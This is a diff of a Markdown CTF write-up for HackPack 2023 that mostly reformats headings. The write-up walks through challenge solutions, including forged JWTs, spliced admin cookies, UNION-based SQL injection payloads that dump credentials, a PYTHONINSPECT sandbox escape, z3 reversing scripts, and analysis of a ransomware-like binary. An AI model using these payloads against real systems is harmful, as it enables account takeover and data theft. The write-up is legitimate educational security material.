@@ -4,13 +4,13 @@ date: "2023-04-14"
 tags: ["CTF", "hackpack", "jeopardy"]
 ---
 
-# Pwn
+## Pwn
 
-# Number store
+### Number store
 
 This challenge was a basic heap challenge. Upon execution, we are greeted with the usual menu:
 
-```
+```text
 1.) Store New Number
 2.) Delete Number
 3.) Edit Number
@@ -108,7 +108,7 @@ def rand():
 def main():
     global io
 
-    # good luck pwning :)
+    ## good luck pwning :)
     store(0, b"AAAA")
     delete(0)
     rand()
@@ -123,9 +123,9 @@ if __name__ == "__main__":
     main()
 ```
 
-# Web
+## Web
 
-## hackerchat
+### hackerchat
 
 After registering and logging in, we notice that the endpoint `/dashboard` causes a POST request on the `/search` endpoint with our username as body (json encoded).
 
@@ -141,7 +141,7 @@ By decoding the jwt in [jwt.io](jwt.io) we verify that it is signed with the adm
 So we change the `sub` field value in the jwt, which contains our username, to `admin` and sign it again with the secret found.
 Once logged as admin, we find the flag in one of the messages displayed in the dashboard.
 
-## Penguinator
+### Penguinator
 
 The description of the challenge contains the admin cookie: `/SsLocjiwUwqJW7uuAaD2ufL2ok0RaOZTXokZ77E1rjtIqkQpTKGuvkE0s+8vC3qlpRciGEo4PnE0BuYMOGYtA==`.
 
@@ -167,7 +167,7 @@ By taking the first block of the admin cookie and the last part of our cookie, w
 `/SsLocjiwUwqJW7uuAaD2` + `pM22GUNDsWmb1eyJfuOhBloQnwLsg1jLXEWPfK2wrYSeYK33B7FQ4qeQVmBc9zRbw==` = `/SsLocjiwUwqJW7uuAaD2pM22GUNDsWmb1eyJfuOhBloQnwLsg1jLXEWPfK2wrYSeYK33B7FQ4qeQVmBc9zRbw==`
 By using this cookie we logged in as admin and get the flag.
 
-## wolfhowl
+### wolfhowl
 
 The challenge description states "Log into WolfHowl to get the flag".
 
@@ -187,9 +187,9 @@ We notice an employee table with fields EmployeeId,LastName,FirstName,Title,Repo
 
 So, we fetch the emails and passwords with the query `" union select email, password, 3, 4 from employee -- |` and we are able to log in and get the flag.
 
-# Misc
+## Misc
 
-## Low code low security
+### Low code low security
 
 This challenge, which erroneously ended up in the pwn category, featured a service that would execute a workflow net written using Camunda. Even though it is not the focus of the challenge, Camunda is a process orchestrator that allows to define workflows using the workflow net formalism (a sort of Petri net with many advanced features).
 
@@ -202,7 +202,7 @@ The lengthy challenge description informs us that the remote instance has four h
 
 We first started by playing around with the service tasks by inserting random bogus data. When we first sent it to the server, we noticed something SUS inthe logs it returned:
 
-```
+```text
 2023/04/16 17:11:32 Creating Database
 2023/04/16 17:11:32 Inserting test data
 2023/04/16 17:11:32 UNIQUE constraint failed: users.id
@@ -215,7 +215,7 @@ We first started by playing around with the service tasks by inserting random bo
 It looks like the remote process is using a database. We quickly tried inserting a single quote in the username and password for the `validate-login` password, as it would likely be the one executing a SELECT query on the database.
 The resulting logs are the following:
 
-```
+```text
 2023/04/16 17:16:18 Creating Database
 2023/04/16 17:16:18 Inserting test data
 2023/04/16 17:16:18 UNIQUE constraint failed: users.id
@@ -240,14 +240,14 @@ This confirms that this is an SQL injection! After determining the remote databa
 
 A nice trick about sqlite3 is that it saves the SQL of some (past?) queries in the `sqlite_schema` table. This means that we can get the flag by simply leaking the SQL used in the database. To do so, we injected the following SQL: `admin' UNION SELECT 0,'a',sql FROM sqlite_schema WHERE sql LIKE '%flag%' -- `. This returns the following:
 
-```
+```text
 ...
 2023/04/16 17:20:43 Validating login user=admin' UNION SELECT 0,'a',sql FROM sqlite_schema WHERE sql LIKE '%flag%' --
 2023/04/16 17:20:43 SQL statement=SELECT * FROM users WHERE name ='admin' UNION SELECT 0,'a',sql FROM sqlite_schema WHERE sql LIKE '%flag%' -- ' AND pw ='admin'
 2023/04/16 17:20:43 User exists with name=admin and pw=flag{eZ_M0n3y!1?}
 ```
 
-## Ezila
+### Ezila
 
 This challange offered a remote shell to a server. In the server, there are a few interesting files:
 
@@ -268,7 +268,7 @@ After dumping the `run-ezila` ELF file, we saw that it simply was an interface t
 
 We searched around a little bit on Google due to a sentence in CREDITS.txt:
 
-```
+```text
 ELIZA-in-Python implementation forked from https://github.com/wadetb/eliza.
 
 If you like the challenge, go give the original repo a star!
@@ -281,7 +281,7 @@ It says that this is a fork. However, we could not find a fork of the linked rep
 Some hours and dumb tries later, we remembered about python environment variables. [This page](https://docs.python.org/3/using/cmdline.html) contains the full list of environment variables used by the python interpreter. There are many solutions using env variables, with the intended one probably being using `PYTHONPATH` to override some python methods called by `ezila.py`.
 However, the one we found is pretty neat: [PYTHONINSPECT](https://docs.python.org/3/using/cmdline.html#envvar-PYTHONINSPECT). As per the linked docs, this variable has the same meaning of passing `-i` in the `python` cmdline, that is:
 
-```
+```text
 When a script is passed as first argument or the -c option is used, enter interactive mode after executing the script or the command, even when sys.stdin does not appear to be a terminal. The PYTHONSTARTUP file is not read.
 ```
 
@@ -303,9 +303,9 @@ $ cat flag.txt
 flag{n3v3r_7ru57_a_ch@7b07_t0_cl3@n_th3_3nv1r0nm3n7}
 ```
 
-# Rev
+## Rev
 
-## Speed-Rev: Bots
+### Speed-Rev: Bots
 
 In this challenge we were given a remote host and we were asked to complete six levels in three minutes.
 
@@ -315,7 +315,7 @@ By looking at the ELFs we can see that this "flag" is validated through the func
 
 Since this challenge was pretty much the same as `Speed-Rev: Humans`, this solution can also solve that challenge.
 
-### Level 1
+#### Level 1
 
 ---
 
@@ -333,7 +333,7 @@ def solveRead(elf) -> str:
     return elf.read(offset, 16).decode()
 ```
 
-### Level 2 and 3
+#### Level 2 and 3
 
 ---
 
@@ -365,13 +365,13 @@ def solveDisass(elf) -> str:
 
 Another, and possibly faster, approach would be just to look for the hex sequence preceding the `cmp` instruction (`\x0f\xb6\x00\x3c`) and take the value of the byte right after, but the time constraints weren't so tight so I chose the more readable alternative.
 
-### Level 4
+#### Level 4
 
 ---
 
 The validation function for the fourth level is a bit more complex.
 
-```
+```text
 in[0] + in[1] == V0
 in[1] + in[2] == V1
 in[2] + in[3] == V2
@@ -402,16 +402,16 @@ def solveZ3(elf) -> str:
 
     for ins in disass:
         if ins.id == X86_INS_CMP:
-            values.append(ins.operands[1].imm) # Save the value
+            values.append(ins.operands[1].imm) ## Save the value
 
     s = Solver()
     x = IntVector('x', 16)
 
-    # Solving constaints
+    ## Solving constaints
     for i, val in enumerate(values):
         s.add(x[i] + x[i+1] == val)
 
-    # Alphanumeric constraints
+    ## Alphanumeric constraints
     for i in range(16):
         s.add(Or(And(x[i] >= ord('0'), x[i] <= ord('9')), And(x[i] >= ord('A'), x[i] <= ord('Z')), And(x[i] >= ord('a'), x[i] <= ord('z'))))
 
@@ -424,7 +424,7 @@ def solveZ3(elf) -> str:
         exit(-1)
 ```
 
-### Level 5 and 6
+#### Level 5 and 6
 
 ---
 
@@ -453,17 +453,17 @@ def solveZ3(elf) -> str:
 
     for ins in disass:
         if ins.id == X86_INS_CMP:
-            values.append((ins.operands[1].imm, prevInstr.id == X86_INS_ADD)) # Save the value and whether it's an x[i] == v or an x[i] + x[i+1] == v constraint
+            values.append((ins.operands[1].imm, prevInstr.id == X86_INS_ADD)) ## Save the value and whether it's an x[i] == v or an x[i] + x[i+1] == v constraint
         prevInstr = ins
 
     s = Solver()
     x = IntVector('x', 16)
 
-    # Solving constaints
+    ## Solving constaints
     for i, (val, isEq) in enumerate(values):
         s.add(x[i] + x[i+1] == val if isEq else x[i] == val)
 
-    # Alphanumeric constraints
+    ## Alphanumeric constraints
     for i in range(16):
         s.add(Or(And(x[i] >= ord('0'), x[i] <= ord('9')), And(x[i] >= ord('A'), x[i] <= ord('Z')), And(x[i] >= ord('a'), x[i] <= ord('z'))))
 
@@ -476,7 +476,7 @@ def solveZ3(elf) -> str:
         exit(-1)
 ```
 
-### Final script
+#### Final script
 
 ```python
 #!/usr/bin/env python3
@@ -530,17 +530,17 @@ def solveZ3(elf) -> str:
 
     for ins in disass:
         if ins.id == X86_INS_CMP:
-            values.append((ins.operands[1].imm, prevInstr.id == X86_INS_ADD)) # Save the value and whether it's an x[i] == v or an x[i] + x[i+1] == v constraint
+            values.append((ins.operands[1].imm, prevInstr.id == X86_INS_ADD)) ## Save the value and whether it's an x[i] == v or an x[i] + x[i+1] == v constraint
         prevInstr = ins
 
     s = Solver()
     x = IntVector('x', 16)
 
-    # Solving constaints
+    ## Solving constaints
     for i, (val, isEq) in enumerate(values):
         s.add(x[i] + x[i+1] == val if isEq else x[i] == val)
 
-    # Alphanumeric constraints
+    ## Alphanumeric constraints
     for i in range(16):
         s.add(Or(And(x[i] >= ord('0'), x[i] <= ord('9')), And(x[i] >= ord('A'), x[i] <= ord('Z')), And(x[i] >= ord('a'), x[i] <= ord('z'))))
 
@@ -575,7 +575,7 @@ if __name__ == "__main__":
     solve()
 ```
 
-## Ransomware or warioware
+### Ransomware or warioware
 
 We are given an ELF, together with a directory with a `flag.txt` and a `.DS_Store` files. Unfortunately, the ELF is a Rust binary, which are well-known for being a pain to reverse-engineer. As the description of the challenge (and its title) hinted at the binary possibly being a ransomware, we avoided executing it on our machine (at least before reversing it a little bit and running it on a virtual machine), which is always a good choice.
 
@@ -596,7 +596,7 @@ Ok, that was a lot of stuff. Keep in mind that the process of going through the 
 
 Some hours later, we actually found a call to what may be a lambda function (`once_cell::imp::OnceCell<T>::initialize(&AEAD_TEXT,&AEAD_TEXT);`) which we skipped for a while. It wasn't actually useful, as we will see later.
 
-### Initial checks and key
+#### Initial checks and key
 
 This is the most bloated part of the binary. Ghidra insists on decompiling a couple of never-heard-of ASM instructions to 30/40 lines of impossible-to-read C code. All we noticed is that it appears to read the filenames in the current directory, process them using sha256 in some way, and use that to derive a key.
 
@@ -604,13 +604,13 @@ In particular, by trying to encrypt a file, we noticed that the key depended onl
 
 As we didn't want to reverse the code computing the key, we just used GDB to encrypt a file in the flag directory. By doing so, the code would compute the key for us, allowing us to simply break when the AES-GCM key was initialized and dump the key.
 
-### Encryption and serialization
+#### Encryption and serialization
 
 Once found the crate used by the binary, we just had to match the arguments of the function calls to track how data propagated afterwards. In particular, the `Aead::encrypt` function had its arguments a little scrambled: the first argument is the output, that is, a pointer to a string/vector, the second the object to which the function call refers to, and then the plaintext and the nonce.
 
 After encryption, the output was then serialized using `serde_pickle`. The `flag.txt` content is the following (output passed through `xxd`):
 
-```
+```text
 00000000: 8003 7d28 580a 0000 0063 6970 6865 7274  ..}(X....ciphert
 00000010: 6578 745d 284b 3c4b f64b 214b f94b 464b  ext](K<K.K!K.KFK
 00000020: d24b ef4b 9b4b 324b b74b d84b 004b 154b  .K.K.K2K.K.K.K.K
@@ -718,7 +718,7 @@ fn main() {
 
 When running it, we get two vectors: one for the ciphertext, and one for the nonce used.
 
-### Decrypting
+#### Decrypting
 
 Unfortunately, we tried to decrypt the ciphertext using the recovered key and nonce with the Rust library that was used... but it didn't work for a long time, and here's a couple of reason why. First, the ciphertext actually contains, in the last 16 bytes, the tag. We found this out by encrypting and decrypting some samples. Moreover, the crate does not have a function to decrypt AES-GCM without verifying the tag too, meaning that if the tag check fails we don't even get a result.
 Finally, recall the lambda function I mentioned earlier? Well, it contained a function that decrypted this text "You had better include this as associated data!", followed by some other junk.
